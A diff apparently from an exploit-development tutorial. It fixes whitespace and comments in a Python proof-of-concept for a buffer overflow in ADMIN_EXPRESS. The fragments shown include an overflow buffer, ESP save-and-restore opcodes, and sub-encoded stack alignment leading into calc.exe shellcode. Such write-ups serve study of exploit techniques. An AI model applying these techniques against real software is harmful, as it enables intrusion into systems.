@@ -247,9 +247,9 @@ root@kali:~/ADMIN_EXPRESS/POC# cat poc.py
 
 # We need to save the current stack pointer before execution of shellcode, due to
 # old stack pointer value needed when executing our payload of calc.exe. This puts the current stack pointer 0x0012DC98 into ECX, to be used later
-restore = "\x54" 			# push esp; (pushing the current value of ESP, which needs to be restored later, onto the stack)
-restore += "\x59" 			# pop ecx; (holding the value of old ESP in ECX, to be called later.)
-restore += "\x51" 			# push ecx; (to get the value on the stack for the mov esp command later)
+restore = "\x54"                        # push esp; (pushing the current value of ESP, which needs to be restored later, onto the stack)
+restore += "\x59"                       # pop ecx; (holding the value of old ESP in ECX, to be called later.)
+restore += "\x51"                       # push ecx; (to get the value on the stack for the mov esp command later)
 
 # All togther now.
 payload = "\x41" * 4260
@@ -425,11 +425,11 @@ alignment += "\x58" # pop eax; (puts the value of ESP into EAX)
 # other operations, I used little endian. If you do all of the calculations in one way, you do not need to flip the sub
 # math difference results. This is how I keep things straight
 # 384D5555 364D5555 364E5555
-alignment += "\x2d\x38\x4d\x55\x55" # sub eax, 0x384D5555
-alignment += "\x2d\x36\x4d\x55\x55" # sub eax, 0x364D5555
-alignment += "\x2d\x36\x4e\x55\x55" # sub eax, 0x364E5555
-alignment += "\x50" # push eax
-alignment += "\x5c" # pop esp; (puts the value of eax back into es
+alignment += "\x2d\x38\x4d\x55\x55" 	# sub eax, 0x384D5555
+alignment += "\x2d\x36\x4d\x55\x55" 	# sub eax, 0x364D5555
+alignment += "\x2d\x36\x4e\x55\x55"	# sub eax, 0x364E5555
+alignment += "\x50" 		   	# push eax
+alignment += "\x5c" 			# pop esp; (puts the value of eax back into esp)
 
 # All together now.
 payload = "\x41" * 4260
@@ -601,7 +601,7 @@ alignment += "\x2d\x38\x4d\x55\x55" 	# sub eax, 0x384D5555
 alignment += "\x2d\x36\x4d\x55\x55" 	# sub eax, 0x364D5555
 alignment += "\x2d\x36\x4e\x55\x55"	# sub eax, 0x364E5555
 alignment += "\x50" 		   	# push eax
-alignment += "\x5c" 			# pop esp; (puts the value of eax back into es
+alignment += "\x5c" 			# pop esp; (puts the value of eax back into esp)
 
 # calc.exe shellcode, via the sub method. Values needed are as followed. Reference the calc.exe shellcode line for line numbers.
 # 1st line = 2C552D14 01552D14 01562E16
